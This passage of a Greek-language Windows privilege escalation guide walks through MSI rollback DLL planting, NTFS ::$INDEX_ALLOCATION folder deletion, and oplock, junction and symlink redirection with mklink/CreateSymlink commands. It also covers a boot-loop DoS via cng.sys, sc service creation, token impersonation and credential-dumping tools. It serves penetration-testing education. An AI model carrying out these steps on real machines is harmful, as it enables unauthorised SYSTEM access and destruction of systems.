    - Διέγραψε χειροκίνητα το αρχείο `.rbf`.
    - Τώρα το **`C:\Config.Msi` είναι κενό**, έτοιμο για hijack.

> Σε αυτό το σημείο, **ενεργοποίησε την ευπάθεια αυθαίρετης διαγραφής φακέλου σε επίπεδο SYSTEM** για να διαγράψεις το `C:\Config.Msi`.

2. **Στάδιο 2 – Αντικατάσταση των Rollback Scripts με κακόβουλα**

- Βήμα 6: Αναδημιουργία του `C:\Config.Msi` με αδύναμες ACL
    - Δημιούργησε ξανά τον φάκελο `C:\Config.Msi`.
    - Όρισε **αδύναμες DACL** (π.χ. Everyone:F) και **κράτησε ένα handle ανοιχτό** με δικαίωμα `WRITE_DAC`.

- Βήμα 7: Εκτέλεση άλλης εγκατάστασης
    - Εγκατάστησε ξανά το `.msi`, με:
        - `TARGETDIR`: Εγγράψιμη τοποθεσία.
        - `ERROROUT`: Μια μεταβλητή που προκαλεί αναγκαστική αποτυχία.
    - Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει τα `.rbs` και `.rbf`.

- Βήμα 8: Παρακολούθηση για `.rbs`
    - Χρησιμοποίησε το `ReadDirectoryChangesW` για να παρακολουθείς το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
    - Κατέγραψε το όνομα του αρχείου.

- Βήμα 9: Συγχρονισμός πριν από το rollback
    - Το `.msi` περιέχει μια **custom ενέργεια εγκατάστασης (`SyncBeforeRollback`)** που:
        - Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
        - Έπειτα **περιμένει** πριν συνεχίσει.

- Βήμα 10: Επαναφορά των αδύναμων ACL
    - Αφού λάβεις το event `.rbs created`:
        - Το Windows Installer **εφαρμόζει ξανά ισχυρές ACL** στο `C:\Config.Msi`.
        - Όμως, επειδή εξακολουθείς να έχεις ένα handle με δικαίωμα `WRITE_DAC`, μπορείς να **εφαρμόσεις ξανά αδύναμες ACL**.

> Οι ACL **εφαρμόζονται μόνο κατά το άνοιγμα του handle**, επομένως μπορείς να γράψεις στον φάκελο.

- Βήμα 11: Τοποθέτηση πλαστών `.rbs` και `.rbf`
    - Αντικατάστησε το αρχείο `.rbs` με ένα **πλαστό rollback script** που λέει στο Windows να:
        - Επαναφέρει το αρχείο `.rbf` σου (κακόβουλο DLL) σε μια **προνομιακή τοποθεσία** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Τοποθέτησε το πλαστό `.rbf` που περιέχει ένα **κακόβουλο payload DLL επιπέδου SYSTEM**.

- Βήμα 12: Ενεργοποίηση του rollback
    - Στείλε σήμα στο event συγχρονισμού, ώστε να συνεχίσει το installer.
    - Έχει διαμορφωθεί μια **custom ενέργεια τύπου 19 (`ErrorOut`)**, ώστε να **αποτύχει σκόπιμα η εγκατάσταση** σε ένα γνωστό σημείο.
    - Αυτό προκαλεί την **έναρξη του rollback**.

- Βήμα 13: Το SYSTEM εγκαθιστά το DLL σου
    - Το Windows Installer:
        - Διαβάζει το κακόβουλο `.rbs` σου.
        - Αντιγράφει το DLL `.rbf` σου στην τοποθεσία-στόχο.
    - Τώρα έχεις το **κακόβουλο DLL σε διαδρομή από την οποία φορτώνεται από το SYSTEM**.

- Τελικό βήμα: Εκτέλεση κώδικα ως SYSTEM
    - Εκτέλεσε ένα έμπιστο **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL που έκανες hijack.
    - **Έτοιμο**: Ο κώδικάς σου εκτελείται **ως SYSTEM**.


### Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία αρχείου σε SYSTEM EoP

Η βασική τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείς να διαγράψεις **ολόκληρο φάκελο** (π.χ. `C:\Config.Msi`). Τι γίνεται, όμως, αν η ευπάθειά σου επιτρέπει μόνο **αυθαίρετη διαγραφή αρχείων**;

Θα μπορούσες να εκμεταλλευτείς τα **εσωτερικά του NTFS**: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Αυτή η ροή αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Επομένως, αν **διαγράψετε τη ροή `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε αυτό χρησιμοποιώντας τυπικά API διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Παρόλο που καλείτε ένα API διαγραφής *file*, αυτό **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σας δεν επιτρέπει να διαγράψετε αυθαίρετα αρχεία/φακέλους, αλλά **επιτρέπει τη διαγραφή των *περιεχομένων* ενός φακέλου που ελέγχει ο επιτιθέμενος**;

1. Βήμα 1: Ρυθμίστε έναν φάκελο-δόλωμα και ένα αρχείο
- Δημιουργήστε: `C:\temp\folder1`
- Μέσα σε αυτόν: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθετήστε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια privileged διεργασία προσπαθεί να διαγράψει το `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Βήμα 3: Ενεργοποίηση διεργασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, **ενεργοποιείται το oplock** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο callback του oplock – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνηση του `file1.txt` αλλού
    - Αυτό αδειάζει το `folder1` χωρίς να διακόπτει το oplock.
    - Μην διαγράψετε απευθείας το `file1.txt` — αυτό θα απελευθέρωνε πρόωρα το oplock.

- Επιλογή B: Μετατροπή του `folder1` σε **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Αυτό στοχεύει την εσωτερική ροή του NTFS που αποθηκεύει τα μεταδεδομένα του φακέλου — αν τη διαγράψετε, διαγράφετε τον φάκελο.

5. Step 5: Release the oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Αποτέλεσμα**: Το `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από τη δημιουργία αυθαίρετου φακέλου σε μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμα κι αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα permissions**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```

- Αυτή η διαδρομή αντιστοιχεί συνήθως στο kernel-mode driver `cng.sys`.
- Αν **την προδημιουργήσετε ως φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βρίσκουν τον φάκελο, **αποτυγχάνουν να εντοπίσουν τον πραγματικό driver** και **καταρρέουν ή διακόπτουν την εκκίνηση**.
- **Δεν υπάρχει εναλλακτική**, ούτε **ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. επιδιόρθωση εκκίνησης ή πρόσβαση στον δίσκο).

### Από προνομιακές διαδρομές αρχείων καταγραφής/αντιγράφων ασφαλείας + OM symlinks σε αυθαίρετη αντικατάσταση αρχείων / boot DoS

Όταν μια **προνομιακή υπηρεσία** γράφει αρχεία καταγραφής/εξαγωγές σε μια διαδρομή που διαβάζεται από μια **εγγράψιμη ρύθμιση παραμέτρων**, ανακατευθύνετε αυτή τη διαδρομή με **Object Manager symlinks + NTFS mount points**, ώστε η προνομιακή εγγραφή να οδηγήσει σε αυθαίρετη αντικατάσταση αρχείων (ακόμη και **χωρίς** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Απαιτήσεις**
- Η ρύθμιση παραμέτρων που αποθηκεύει τη διαδρομή-στόχο είναι εγγράψιμη από τον επιτιθέμενο (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς το `\RPC Control` και OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Μια προνομιακή λειτουργία που γράφει σε αυτή τη διαδρομή (αρχείο καταγραφής, εξαγωγή, αναφορά).

**Παράδειγμα αλυσίδας**
1. Διαβάστε τη ρύθμιση παραμέτρων για να εντοπίσετε τον προνομιακό προορισμό του αρχείου καταγραφής, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε να γράψει το προνομιούχο στοιχείο το log (π.χ. ο διαχειριστής επιλέγει «αποστολή δοκιμαστικού SMS»). Η εγγραφή καταλήγει πλέον στο `C:\Windows\System32\cng.sys`.
4. Εξετάστε τον στόχο που αντικαταστάθηκε (hex/PE parser) για να επιβεβαιώσετε την αλλοίωση· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν τη διαδρομή του αλλοιωμένου driver → **boot loop DoS**. Αυτό ισχύει επίσης για οποιοδήποτε προστατευμένο αρχείο ανοίγει για εγγραφή μια προνομιούχα υπηρεσία.

> Το `cng.sys` φορτώνεται κανονικά από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει αντίγραφό του στο `C:\Windows\System32\cng.sys`, μπορεί να δοκιμαστεί πρώτο, καθιστώντας το αξιόπιστο sink DoS για αλλοιωμένα δεδομένα.



## **Από High Integrity σε System**

### **Νέα υπηρεσία**

Αν εκτελείτε ήδη μια διεργασία High Integrity, η **διαδρομή προς το SYSTEM** μπορεί να είναι εύκολη: απλώς **δημιουργήστε και εκτελέστε μια νέα υπηρεσία**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Όταν δημιουργείτε ένα binary υπηρεσίας, βεβαιωθείτε ότι είναι έγκυρη υπηρεσία ή ότι το binary εκτελεί γρήγορα τις απαραίτητες ενέργειες, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρη υπηρεσία.

### AlwaysInstallElevated

Από μια διεργασία High Integrity μπορείτε να δοκιμάσετε να **ενεργοποιήσετε τις εγγραφές μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα wrapper _**.msi**_.\
[Περισσότερες πληροφορίες για τα κλειδιά μητρώου που εμπλέκονται και για το πώς να εγκαταστήσετε ένα πακέτο _.msi_ εδώ.](#alwaysinstallelevated)

### Υψηλή ακεραιότητα + προνόμιο SeImpersonate προς System

**Μπορείτε να** [**βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### Από SeDebug + SeImpersonate σε προνόμια Full Token

Αν έχετε αυτά τα προνόμια token (πιθανότατα θα τα βρείτε σε μια διεργασία High Integrity), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (εκτός από προστατευμένες διεργασίες) με το προνόμιο SeDebug, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με αυτό το token**.\
Με αυτήν την τεχνική συνήθως **επιλέγεται οποιαδήποτε διεργασία εκτελείται ως SYSTEM με όλα τα προνόμια token** (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα προνόμια token_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για κλιμάκωση προνομίων στο `getsystem`. Η τεχνική συνίσταται στη **δημιουργία ενός pipe και στη συνέχεια στη δημιουργία/κατάχρηση μιας υπηρεσίας ώστε να γράφει σε αυτό το pipe**. Έπειτα, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το προνόμιο **`SeImpersonate`** θα μπορεί να **υποδυθεί το token** του client του pipe (της υπηρεσίας), αποκτώντας προνόμια SYSTEM.\
Αν θέλετε να [**μάθετε περισσότερα για τα name pipes, διαβάστε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα για το [**πώς να μεταβείτε από High Integrity σε System χρησιμοποιώντας name pipes, διαβάστε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **κάνετε hijack ένα dll** που **φορτώνεται** από μια **διεργασία** η οποία εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως, το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος κλιμάκωσης προνομίων και, επιπλέον, είναι πολύ **ευκολότερο να επιτευχθεί από μια διεργασία High Integrity**, καθώς αυτή θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε να** [**μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **Από Administrator ή Network Service σε System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Από LOCAL SERVICE ή NETWORK SERVICE σε πλήρη προνόμια

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Το καλύτερο εργαλείο για την αναζήτηση διανυσμάτων τοπικής κλιμάκωσης προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για λανθασμένες ρυθμίσεις και ευαίσθητα αρχεία (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Εντοπίστηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για πιθανές λανθασμένες ρυθμίσεις και συλλογή πληροφοριών (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για λανθασμένες ρυθμίσεις**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες συνεδριών PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε το -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει διαπιστευτήρια από το Credential Manager. Εντοπίστηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Δοκιμάζει μαζικά τους κωδικούς πρόσβασης που συλλέχθηκαν σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι εργαλείο PowerShell για spoofing ADIDNS/LLMNR/mDNS και man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική απαρίθμηση privesc στα Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση γνωστών ευπαθειών privesc (DEPRECATED, αντικαταστάθηκε από το Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών ευπαθειών privesc (πρέπει να γίνει compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Απαριθμεί το host για να αναζητήσει λανθασμένες ρυθμίσεις (περισσότερο εργαλείο συλλογής πληροφοριών παρά privesc) (πρέπει να γίνει compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει διαπιστευτήρια από πολλά λογισμικά (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για λανθασμένες ρυθμίσεις (εκτελέσιμο precompiled στο github). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές λανθασμένες ρυθμίσεις (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο που δημιουργήθηκε με βάση αυτήν την ανάρτηση (δεν χρειάζεται accesschk για να λειτουργήσει σωστά, αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο host-θύμα, μπορείτε να εκτελέσετε:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Βασικές αρχές κλιμάκωσης προνομίων στα Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Αύξηση προνομίων μέσω εκμετάλλευσης αδύναμων δικαιωμάτων φακέλων](http://www.greyhathacker.net/?p=738)
- [3] [Κλιμάκωση προνομίων στα Windows - σκονάκι](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop τοπικής κλιμάκωσης προνομίων σε Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Επιθέσεις στα Windows: Το AT είναι το νέο μαύρο (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Κλιμάκωση προνομίων - Windows - Πλήρης οδηγός OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Κλιμάκωση προνομίων - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Οδηγός κλιμάκωσης προνομίων στα Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Λίστα ελέγχου κλιμάκωσης προνομίων στα Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Κλιμάκωση προνομίων στα Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Μέθοδοι κλιμάκωσης προνομίων στα Windows για Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing με Word VBA macro μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 για SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak μέσω format-string + stack BOF → VirtualAlloc ROP (RCE) και κλοπή kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Κυνηγώντας την Silver Fox: γάτα και ποντίκι στις σκιές του kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ευπάθεια προνομιούχου συστήματος αρχείων σε σύστημα SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Εργαλεία δοκιμής συμβολικών συνδέσμων – χρήση του CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ένας σύνδεσμος στο παρελθόν. Κατάχρηση συμβολικών συνδέσμων στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (μεταφορά του Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Επικίνδυνη επίλυση module στα Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Modules Node.js: φόρτωση από φακέλους `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Προκλήσεις checklist C/C++, λυμένες](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Συνάρτηση RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Κατάληψη δυαδικών αρχείων υπηρεσιών](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own με Microslop: συνδυασμός συνθηκών ανταγωνισμού CLDFLT και DirectX Kernel για LPE στα Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ένα I/O Ring για να τους κυβερνά όλους: πλήρες exploit primitive ανάγνωσης/εγγραφής στα Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Κατάχρηση αυθαίρετων διαγραφών αρχείων για κλιμάκωση προνομίων και άλλα χρήσιμα κόλπα](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Κώδικας exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Επιθέσεις WSUS, Μέρος 2: CVE-2020-1013, κλιμάκωση τοπικών προνομίων στα Windows 10 τύπου 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Εξερεύνηση του Credential Manager και του Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Αντιπροσωπεία περιορισμένης πρόσβασης βάσει πόρων Kerberos: όταν μια αλλαγή εικόνας οδηγεί σε κλιμάκωση προνομίων](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Εξαγωγή ιδιωτικών κλειδιών SSH από το SSH Agent των Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Μετατρέποντας εταιρικούς servers ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Μετατρέποντας εταιρικούς servers ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Κλιμάκωση προνομίων μέσω διαγραφής φακέλου του Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Αναδρομή στα βήματά σας πίσω στο NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
